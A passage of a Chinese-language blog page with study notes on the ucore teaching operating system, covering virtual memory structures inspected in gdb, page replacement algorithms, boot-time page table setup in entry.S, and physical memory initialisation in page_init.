<h2 id="&#x5176;&#x4ED6;"><a href="#&#x5176;&#x4ED6;" class="headerlink" title="&#x5176;&#x4ED6;"></a>&#x5176;&#x4ED6;</h2><h3 id="&#x4F7F;&#x7528;gdb&#x67E5;&#x770B;mm-struct-&#x548C;-vma-struct-&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5185;&#x5BB9;"><a href="#&#x4F7F;&#x7528;gdb&#x67E5;&#x770B;mm-struct-&#x548C;-vma-struct-&#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5185;&#x5BB9;" class="headerlink" title="&#x4F7F;&#x7528;gdb&#x67E5;&#x770B;mm_struct &#x548C; vma_struct &#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5185;&#x5BB9;"></a>&#x4F7F;&#x7528;gdb&#x67E5;&#x770B;mm_struct &#x548C; vma_struct &#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5185;&#x5BB9;</h3><p>&#x67E5;&#x770B; mm_struct &#x548C; vma_struct &#x7ED3;&#x6784;&#x4F53;&#x7684;&#x5185;&#x5BB9;&#x3002;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x521D;&#x59CB;&#x65F6;&#xFF0C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;&#x9875;&#x76EE;&#x5F55;&#x8868;&#x9879;&#xFF0C;&#x7EF4;&#x62A4;&#x4E86;&#x4E00;&#x4E2A;&#x9875;&#x8868;&#xFF0C;&#x8BE5;&#x9875;&#x8868;&#x7EF4;&#x62A4;&#x4E86;0~4M&#x7684;&#x865A;&#x62DF;&#x5185;&#x5B58;&#x7A7A;&#x95F4;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">gef&#x27A4;  p check_mm_struct</span><br><span class="line">$<span class="number">3</span> = (struct mm_struct *) <span class="number">0xc0303000</span></span><br><span class="line">  </span><br><span class="line">gef&#x27A4;  p *((struct mm_struct *) <span class="number">0xc0303000</span>)</span><br><span class="line">$<span class="number">12</span> = {</span><br><span class="line">  mmap_list = {</span><br><span class="line">    prev = <span class="number">0xc0304010</span>, </span><br><span class="line">    next = <span class="number">0xc0304010</span></span><br><span class="line">  }, </span><br><span class="line">  mmap_cache = <span class="number">0xc0304000</span>, </span><br><span class="line">  pgdir = <span class="number">0xc0120000</span>, </span><br><span class="line">  map_count = <span class="number">0x1</span>, </span><br><span class="line">  sm_priv = <span class="number">0x0</span></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">gef&#x27A4;  p *((struct vma_struct *) (<span class="number">0xc0304010</span><span class="number">-0x10</span>))</span><br><span class="line">$<span class="number">13</span> = {</span><br><span class="line">  vm_mm = <span class="number">0xc0303000</span>, </span><br><span class="line">  vm_start = <span class="number">0x0</span>, </span><br><span class="line">  vm_end = <span class="number">0x400000</span>, </span><br><span class="line">  vm_flags = <span class="number">0x2</span>, </span><br><span class="line">  list_link = {</span><br><span class="line">    prev = <span class="number">0xc0303000</span>, </span><br><span class="line">    next = <span class="number">0xc0303000</span></span><br><span class="line">  }</span><br><span class="line">}</span><br><span class="line">&#x67E5;&#x770B;&#x9875;&#x8868;&#x5185;&#x5BB9;&#xFF0C;&#x53EF;&#x4EE5;&#x770B;&#x5230;&#x9875;&#x8868;&#x4E2D;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x6620;&#x5C04;</span><br><span class="line">gef&#x27A4;  x/<span class="number">4</span>xw <span class="number">0xc0120000</span></span><br><span class="line"><span class="number">0xc0120000</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
<h3 id="&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#x5206;&#x7C7B;"><a href="#&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#x5206;&#x7C7B;" class="headerlink" title="&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#x5206;&#x7C7B;"></a>&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#x5206;&#x7C7B;</h3><p>&#x5C40;&#x90E8;&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#xFF1A;1.&#x6700;&#x4F18;&#x7B97;&#x6CD5; 2.FIFO&#x7B97;&#x6CD5; 3.&#x6700;&#x8FD1;&#x6700;&#x4E45;&#x672A;&#x4F7F;&#x7528;&#x7B97;&#x6CD5; 4.&#x65F6;&#x949F;&#x7F6E;&#x6362;&#x7B97;&#x6CD5; 5.&#x6700;&#x4E0D;&#x5E38;&#x7528;&#x7B97;&#x6CD5;</p>
<p>&#x5168;&#x5C40;&#x9875;&#x9762;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;&#xFF1A;1.&#x5DE5;&#x4F5C;&#x96C6;&#x7F6E;&#x6362;&#x7B97;&#x6CD5; 2.&#x7F3A;&#x9875;&#x7387;&#x7F6E;&#x6362;&#x7B97;&#x6CD5;</p>
<h3 id="&#x5C40;&#x90E8;&#x6027;&#x539F;&#x7406;"><a href="#&#x5C40;&#x90E8;&#x6027;&#x539F;&#x7406;" class="headerlink" title="&#x5C40;&#x90E8;&#x6027;&#x539F;&#x7406;"></a>&#x5C40;&#x90E8;&#x6027;&#x539F;&#x7406;</h3><p>&#x7A0B;&#x5E8F;&#x5728;&#x6267;&#x884C;&#x8FC7;&#x7A0B;&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#x8F83;&#x77ED;&#x7684;&#x65F6;&#x671F;&#x5185;&#xFF0C;&#x6240;&#x6267;&#x884C;&#x7684;&#x6307;&#x4EE4;&#x5730;&#x5740;&#x548C;&#x6307;&#x4EE4;&#x64CD;&#x4F5C;&#x6570;&#x5730;&#x5740;&#xFF0C;&#x5206;&#x522B;&#x5C40;&#x9650;&#x4E8E;&#x4E00;&#x5B9A;&#x533A;&#x57DF;&#xFF0C;&#x5305;&#x62EC;&#x65F6;&#x95F4;&#x5C40;&#x90E8;&#x6027;&#x3001;&#x7A7A;&#x95F4;&#x5C40;&#x90E8;&#x6027;&#x3001;&#x5206;&#x652F;&#x5C40;&#x90E8;&#x6027;</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/10/03/mineucore-物理内存管理学习笔记/">mineucore-物理内存管理学习笔记</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-10-03</time><div class="content"><h2 id="0x00-bootloader&#x63A2;&#x6D4B;&#x771F;&#x5B9E;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#xFF08;bootasm-S&#xFF09;"><a href="#0x00-bootloader&#x63A2;&#x6D4B;&#x771F;&#x5B9E;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#xFF08;bootasm-S&#xFF09;" class="headerlink" title="0x00 bootloader&#x63A2;&#x6D4B;&#x771F;&#x5B9E;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#xFF08;bootasm.S&#xFF09;"></a>0x00 bootloader&#x63A2;&#x6D4B;&#x771F;&#x5B9E;&#x7269;&#x7406;&#x5185;&#x5B58;&#x5927;&#x5C0F;&#xFF08;bootasm.S&#xFF09;</h2><p>bootloader&#x901A;&#x8FC7;INT 15h&#x4E2D;&#x65AD;&#xFF0C;&#x4E2D;&#x65AD;&#x53F7;&#x4E3A;e820h&#xFF0C;&#x83B7;&#x53D6;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x5185;&#x5B58;&#x4FE1;&#x606F;&#xFF0C;&#x5C06;&#x6570;&#x636E;&#x6309;struct e820map&#x7684;&#x683C;&#x5F0F;&#x4FDD;&#x5B58;&#x5728;&#x865A;&#x62DF;&#x7A7A;&#x95F4;&#x7684;0xc0000000+0x8000&#x5904;</p>
<h2 id="0x01-&#x4F7F;&#x80FD;&#x6BB5;&#x9875;&#x5F0F;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x673A;&#x5236;&#x7684;&#x8BBE;&#x8BA1;&#x65B9;&#x6848;&#xFF08;entry-S&#xFF09;"><a href="#0x01-&#x4F7F;&#x80FD;&#x6BB5;&#x9875;&#x5F0F;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x673A;&#x5236;&#x7684;&#x8BBE;&#x8BA1;&#x65B9;&#x6848;&#xFF08;entry-S&#xFF09;" class="headerlink" title="0x01 &#x4F7F;&#x80FD;&#x6BB5;&#x9875;&#x5F0F;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x673A;&#x5236;&#x7684;&#x8BBE;&#x8BA1;&#x65B9;&#x6848;&#xFF08;entry.S&#xFF09;"></a>0x01 &#x4F7F;&#x80FD;&#x6BB5;&#x9875;&#x5F0F;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#x673A;&#x5236;&#x7684;&#x8BBE;&#x8BA1;&#x65B9;&#x6848;&#xFF08;entry.S&#xFF09;</h2><p>&#x60F3;&#x8981;&#x6700;&#x7EC8;&#x5B9E;&#x73B0;&#x7684;&#x6BB5;&#x9875;&#x5F0F;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#x662F;&#xFF1A;</p>
<p>Virtual Address = Linear Address = Pythal Address + 0xC0000000</p>
<p>&#x5B9E;&#x6A21;&#x5F0F;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x662F;&#x6CA1;&#x6709;&#x9875;&#x673A;&#x5236;&#x7684;&#xFF0C;ld&#x5728;&#x94FE;&#x63A5;&#x9636;&#x6BB5;&#x751F;&#x6210;&#x4E86;ucore&#x7684;&#x865A;&#x62DF;&#x5730;&#x5740;&#xFF0C;&#x662F;0xc0100000&#xFF0C;&#x4F46;&#x662F;ucore&#x9700;&#x8981;&#x8FD0;&#x884C;&#x5728;&#x4F4E;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x4ECE;&#x8BA1;&#x7B97;&#x673A;&#x52A0;&#x7535;&#x5230;&#x542F;&#x52A8;&#x6BB5;&#x9875;&#x5F0F;&#x7BA1;&#x7406;&#xFF0C;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#x53D1;&#x751F;&#x4E86;&#x591A;&#x6B21;&#x7684;&#x53D8;&#x5316;&#xFF0C;&#x6211;&#x4EEC;&#x901A;&#x8FC7;&#x4EE5;&#x4E0B;&#x4E09;&#x4E2A;&#x9636;&#x6BB5;&#x53BB;&#x5B9E;&#x73B0;&#x8FD9;&#x4E2A;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#xFF1A;</p>
<h3 id="&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#xFF08;&#x5F00;&#x542F;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;&#xFF0C;&#x521B;&#x5EFA;&#x542F;&#x52A8;&#x6BB5;&#x8868;&#xFF09;"><a href="#&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#xFF08;&#x5F00;&#x542F;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;&#xFF0C;&#x521B;&#x5EFA;&#x542F;&#x52A8;&#x6BB5;&#x8868;&#xFF09;" class="headerlink" title="&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#xFF08;&#x5F00;&#x542F;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;&#xFF0C;&#x521B;&#x5EFA;&#x542F;&#x52A8;&#x6BB5;&#x8868;&#xFF09;"></a>&#x7B2C;&#x4E00;&#x9636;&#x6BB5;&#xFF08;&#x5F00;&#x542F;&#x4FDD;&#x62A4;&#x6A21;&#x5F0F;&#xFF0C;&#x521B;&#x5EFA;&#x542F;&#x52A8;&#x6BB5;&#x8868;&#xFF09;</h3><p>&#x8BE5;&#x9636;&#x6BB5;&#x662F;bootloader&#x9636;&#x6BB5;&#xFF0C;&#x6B64;&#x65F6;cpu&#x662F;&#x5B9E;&#x6A21;&#x5F0F;&#xFF0C;&#x6240;&#x4EE5;&#x5730;&#x5740;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#x5982;&#x4E0B;&#xFF1A;<br>Virtual Address = Linear Address = Pythal Address<br>&#x867D;&#x7136;ld&#x94FE;&#x63A5;&#x6587;&#x4EF6;&#x8BF4;&#x660E;&#x4E86;ucore&#x5185;&#x6838;&#x7684;&#x88C5;&#x8F7D;&#x7A7A;&#x95F4;&#x662F;0xC0100000&#xFF0C;&#x4F46;&#x662F;bootloader&#x4F1A;&#x5C06;ucore&#x88C5;&#x8F7D;&#x5230;0x100000&#x4E2D;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readseg(ph-&gt;p_va &amp; <span class="number">0xFFFFFF</span>, ph-&gt;p_memsz, ph-&gt;p_offset);</span><br></pre></td></tr></table></figure>
<h3 id="&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF08;&#x521B;&#x5EFA;&#x521D;&#x59CB;&#x9875;&#x76EE;&#x5F55;&#x8868;&#xFF0C;&#x5F00;&#x542F;&#x5206;&#x9875;&#x6A21;&#x5F0F;&#xFF09;"><a href="#&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF08;&#x521B;&#x5EFA;&#x521D;&#x59CB;&#x9875;&#x76EE;&#x5F55;&#x8868;&#xFF0C;&#x5F00;&#x542F;&#x5206;&#x9875;&#x6A21;&#x5F0F;&#xFF09;" class="headerlink" title="&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF08;&#x521B;&#x5EFA;&#x521D;&#x59CB;&#x9875;&#x76EE;&#x5F55;&#x8868;&#xFF0C;&#x5F00;&#x542F;&#x5206;&#x9875;&#x6A21;&#x5F0F;&#xFF09;"></a>&#x7B2C;&#x4E8C;&#x9636;&#x6BB5;&#xFF08;&#x521B;&#x5EFA;&#x521D;&#x59CB;&#x9875;&#x76EE;&#x5F55;&#x8868;&#xFF0C;&#x5F00;&#x542F;&#x5206;&#x9875;&#x6A21;&#x5F0F;&#xFF09;</h3><p>&#x5728;entry.S&#x7684;kern_entry&#x51FD;&#x6570;&#x4E2D;&#xFF0C;&#x521D;&#x59CB;&#x5316;&#x4E86;&#x4E00;&#x4E2A;&#x4E34;&#x65F6;&#x9875;&#x76EE;&#x5F55;&#x8868;&#x548C;&#x9875;&#x8868;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kern_entry:</span><br><span class="line">    # load pa of boot pgdir</span><br><span class="line">    movl $REALLOC(__boot_pgdir), %eax</span><br><span class="line">    movl %eax, %cr3</span><br><span class="line">......</span><br><span class="line">__boot_pgdir:</span><br><span class="line">.globl __boot_pgdir</span><br><span class="line">    # map va 0 ~ 4M to pa 0 ~ 4M (temporary)</span><br><span class="line">    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)</span><br><span class="line">    .space (KERNBASE &gt;&gt; PGSHIFT &gt;&gt; 10 &lt;&lt; 2) - (. - __boot_pgdir) # pad to PDE of KERNBASE</span><br><span class="line">    # map va KERNBASE + (0 ~ 4M) to pa 0 ~ 4M</span><br><span class="line">    .long REALLOC(__boot_pt1) + (PTE_P | PTE_U | PTE_W)</span><br><span class="line">    .space PGSIZE - (. - __boot_pgdir) # pad to PGSIZE</span><br><span class="line"></span><br><span class="line">.set i, 0</span><br><span class="line">__boot_pt1:</span><br><span class="line">.rept 1024</span><br><span class="line">    .long i * PGSIZE + (PTE_P | PTE_W)</span><br><span class="line">    .set i, i + 1</span><br><span class="line">.endr</span><br></pre></td></tr></table></figure>
<p>&#x89E3;&#x91CA;&#x4E0B;&#x4E34;&#x65F6;&#x6620;&#x5C04;&#x7684;&#x5EFA;&#x7ACB;&#xFF1A;&#x7B2C;9&#x5230;&#x7B2C;13&#x884C;<br>&#x7B2C;&#x4E00;&#x53E5;&#xFF0C;&#x5C06;&#x9875;&#x8868;&#x7684;&#x7269;&#x7406;&#x5730;&#x5740;&#x586B;&#x5165;&#x9875;&#x76EE;&#x5F55;&#x8868;&#x7684;&#x7B2C;&#x4E00;&#x9879;&#xFF0C;&#x5B9E;&#x73B0;map va 0 ~ 4M to pa 0 ~ 4M<br><code>.space    &#x7A7A;&#x5B57;&#x8282;&#x6570;&#xFF0C;&#x540E;&#x9762;&#x8DDF;&#x6570;&#x91CF;    .space 4</code><br>&#x7B2C;&#x4E8C;&#x53E5;&#xFF0C;&#x586B;&#x5145;&#x9875;&#x76EE;&#x5F55;&#x8868;&#xFF0C;&#x586B;&#x5230;0xc0000000&#x90A3;&#x9879;&#xFF0C;KERNBASE  = 0xc0000000&#xFF0C;PGSHIFT = 12&#xFF0C;&#x5411;&#x53F3;&#x79FB;12&#x4F4D;&#xFF0C;&#x63A5;&#x7740;&#x5411;&#x53F3;&#x79FB;10&#x4F4D;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x88AB;4K*1k&#xFF08;4M&#xFF09;&#x9664;&#xFF0C;&#x56E0;&#x4E3A;&#x9875;&#x76EE;&#x5F55;&#x8868;&#x9879;&#x4E00;&#x9879;&#x6620;&#x5C04;&#x7684;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#x662F;4M&#xFF0C;&#x7136;&#x540E;&#x5DE6;&#x79FB;&#x4E24;&#x4F4D;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x4E58;4&#xFF0C;&#x56E0;&#x4E3A;&#x6BCF;&#x4E00;&#x9879;&#x5360;4&#x5B57;&#x8282;&#xFF0C;&#x7136;&#x540E;&#x51CF;&#x53BB;&#xFF08;&#x5F53;&#x524D;&#x5730;&#x5740;&#x51CF;&#x9875;&#x76EE;&#x5F55;&#x8868;&#x7684;&#x5730;&#x5740;&#xFF09;&#xFF0C;&#x76F8;&#x5F53;&#x4E8E;&#x51CF;&#x53BB;&#x9875;&#x76EE;&#x5F55;&#x8868;&#x7B2C;&#x4E00;&#x9879;&#x7684;&#x5730;&#x5740;<br>&#x7B2C;&#x4E09;&#x53E5;&#xFF0C;&#x5B8C;&#x6210;map va KERNBASE + (0 ~ 4M) to pa 0 ~ 4M<br>&#x7B2C;&#x56DB;&#x53E5;&#xFF0C;&#x5C06;&#x9875;&#x76EE;&#x5F55;4K&#x5BF9;&#x9F50;</p>
<p>&#x6620;&#x5C04;&#x5173;&#x7CFB;&#x4E3A;&#xFF1A;<br>Virtual Address = Linear Address = Pythal Address&#xFF08;0~4M&#x7684;&#x7EBF;&#x6027;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#xFF09;<br>Virtual Address = Linear Address = Pythal Address + 0xC0000000&#xFF08;0xC0000000~0xC0000000+4M&#x7684;&#x7EBF;&#x6027;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#xFF09;</p>
<blockquote>
<p>&#x4E3A;&#x4EC0;&#x4E48;&#x8981;&#x8FD9;&#x6837;&#x6620;&#x5C04;&#x5462;&#xFF1F;<br>ucore&#x6B64;&#x65F6;&#x5728;0~4M&#x7684;&#x4F4E;&#x865A;&#x62DF;&#x5730;&#x5740;&#x533A;&#x57DF;&#x8FD0;&#x884C;&#xFF0C;&#x4E3A;&#x4E86;&#x4FDD;&#x8BC1;&#x4F7F;&#x80FD;&#x6BB5;&#x9875;&#x673A;&#x5236;&#x540E;ucore&#x80FD;&#x591F;&#x6B63;&#x5E38;&#x8FD0;&#x884C;&#xFF0C;&#x6240;&#x4EE5;&#x6DFB;&#x52A0;&#x4E86;<code>Virtual Address = Linear Address = Pythal Address&#xFF08;0~4M&#x7684;&#x7EBF;&#x6027;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#xFF09;</code>&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;</p>
</blockquote>
<p>&#x63A5;&#x4E0B;&#x6765;&#x8C03;&#x6574;&#x5185;&#x6838;&#x7684;EIP&#x5230;&#x9AD8;&#x865A;&#x62DF;&#x5730;&#x5740;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    # update eip</span><br><span class="line">    # now, eip = 0x1.....</span><br><span class="line">    leal next, %eax</span><br><span class="line">    # set eip = KERNBASE + 0x1.....</span><br><span class="line">    jmp *%eax</span><br><span class="line">next:</span><br></pre></td></tr></table></figure>
<p>&#x7136;&#x540E;&#x6E05;&#x9664;&#xFF08;0~4M&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#xFF09;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># unmap va 0 ~ 4M, it&apos;s temporary mapping</span><br><span class="line">xorl %eax, %eax</span><br><span class="line">movl %eax, __boot_pgdir</span><br></pre></td></tr></table></figure>
<p>&#x6B64;&#x65F6;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#x5C31;&#x53EA;&#x6709;&#xFF1A;<br>Virtual Address = Linear Address = Pythal Address + 0xC0000000&#xFF08;0xC0000000~0xC0000000+4M&#x7684;&#x7EBF;&#x6027;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#xFF09;</p>
<h3 id="&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#xFF08;&#x5B8C;&#x5584;&#x6BB5;&#x8868;&#x548C;&#x9875;&#x8868;&#xFF09;"><a href="#&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#xFF08;&#x5B8C;&#x5584;&#x6BB5;&#x8868;&#x548C;&#x9875;&#x8868;&#xFF09;" class="headerlink" title="&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#xFF08;&#x5B8C;&#x5584;&#x6BB5;&#x8868;&#x548C;&#x9875;&#x8868;&#xFF09;"></a>&#x7B2C;&#x4E09;&#x9636;&#x6BB5;&#xFF08;&#x5B8C;&#x5584;&#x6BB5;&#x8868;&#x548C;&#x9875;&#x8868;&#xFF09;</h3><p>&#x5C06;&#x9875;&#x76EE;&#x5F55;&#x8868;&#x4ECE;&#xFF08;0~4M&#x6269;&#x5145;&#x5230;0~KMEMSIZE&#xFF09;<br>&#x6700;&#x540E;&#x7684;&#x6620;&#x5C04;&#x5173;&#x7CFB;&#x4E3A;&#xFF1A;</p>
<p>Virtual Address = Linear Address = Pythal Address + 0xC0000000</p>
<h2 id="0x02&#x521D;&#x59CB;&#x5316;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#xFF08;pmm-c-page-init&#xFF09;"><a href="#0x02&#x521D;&#x59CB;&#x5316;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#xFF08;pmm-c-page-init&#xFF09;" class="headerlink" title="0x02&#x521D;&#x59CB;&#x5316;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#xFF08;pmm.c:page_init&#xFF09;"></a>0x02&#x521D;&#x59CB;&#x5316;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7BA1;&#x7406;&#xFF08;pmm.c:page_init&#xFF09;</h2><p>&#x4ECE;&#x7269;&#x7406;&#x5185;&#x5B58;&#x83B7;&#x53D6;&#x7A7A;&#x95F2;&#x5185;&#x5B58;&#x5E03;&#x5C40;<code>struct e820map *memmap = (struct e820map *)(0x8000 + KERNBASE);</code> &#x901A;&#x8FC7;&#x7269;&#x7406;&#x5E03;&#x5C40;&#x83B7;&#x5F97;&#x6700;&#x5927;&#x7684;&#x7269;&#x7406;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#xFF0C;&#x4F46;&#x662F;&#x6700;&#x5927;&#x4E0D;&#x5927;&#x4E8E;0x38000000&#xFF0C;&#x4ECE;&#x800C;&#x8BA1;&#x7B97;&#x5F97;&#x5230;&#x9700;&#x8981;&#x591A;&#x5C11;&#x7269;&#x7406;&#x9875;&#x53BB;&#x7BA1;&#x7406;&#x7269;&#x7406;&#x5185;&#x5B58;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">        <span class="keyword">if</span> (maxpa &lt; end &amp;&amp; begin &lt; KMEMSIZE) {</span><br><span class="line">            maxpa = end;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (maxpa &gt; KMEMSIZE) {<span class="comment">//#define KMEMSIZE            0x38000000   </span></span><br><span class="line">    maxpa = KMEMSIZE;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
<p>&#x56E0;&#x4E3A;&#x52A0;&#x8F7D;ucore&#x7684;&#x7ED3;&#x675F;&#x5730;&#x5740;&#xFF08;&#x7528;end&#x5168;&#x5C40;&#x6307;&#x9488;&#x53D8;&#x91CF;&#x8BB0;&#x5F55;&#xFF09;&#x4EE5;&#x4E0A;&#x7684;&#x9AD8;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#x6CA1;&#x6709;&#x88AB;&#x4F7F;&#x7528;&#xFF0C;&#x6240;&#x4EE5;&#x8BBE;&#x4E3A;&#x7BA1;&#x7406;&#x7269;&#x7406;&#x5185;&#x5B58;&#x7684;&#x7ED3;&#x6784;&#x4F53;Page&#x7684;&#x5185;&#x5B58;&#x7A7A;&#x95F4;&#x8D77;&#x59CB;&#x5730;&#x5740;&#x4E3A; <code>pages = (struct Page *)ROUNDUP((void *)end, PGSIZE);</code></p>
<p>&#x4E3A;&#x4E86;&#x7B80;&#x5316;&#x8D77;&#x89C1;&#xFF0C;&#x5DF2;&#x4F7F;&#x7528;&#x7269;&#x7406;&#x7A7A;&#x95F4;&#x8BBE;&#x4E3A;0~pages&#xFF0C;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x7A7A;&#x95F4;&#x8BBE;&#x4E3A;pages~0x38000000&#x3002;</p>
<p>&#x7ED3;&#x5C3E;&#x8C03;&#x7528;init_memmap&#x51FD;&#x6570;&#x521D;&#x59CB;&#x5316;&#x7A7A;&#x95F2;&#x7269;&#x7406;&#x5730;&#x5740;&#x7A7A;&#x95F4;&#x3002;&#x6BCF;&#x4E00;&#x9875;&#x7269;&#x7406;&#x5E27;&#x90FD;&#x5BF9;&#x5E94;&#x4E00;&#x4E2A;Page&#x7ED3;&#x6784;&#x4F53;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Page</span> {</span></span><br><span class="line">    <span class="keyword">int</span> ref;                        <span class="comment">// page frame&apos;s reference counter to page table</span></span><br><span class="line">    <span class="keyword">uint32_t</span> flags;                 <span class="comment">// array of flags that describe the status of the page frame</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> property;          <span class="comment">// the num of free block, used in first fit pm manager</span></span><br><span class="line">    <span class="keyword">list_entry_t</span> page_link;         <span class="comment">// free list link</span></span><br><span class="line">};</span><br></pre></td></tr></table></figure>
<p>&#x63A5;&#x7740;&#x5BF9;&#x6240;&#x6709;&#x7269;&#x7406;&#x9875;&#x8FDB;&#x884C;&#x5360;&#x7528;&#x6807;&#x8BB0;</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; npage; i ++) {</span><br><span class="line">    SetPageReserved(pages + i);</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
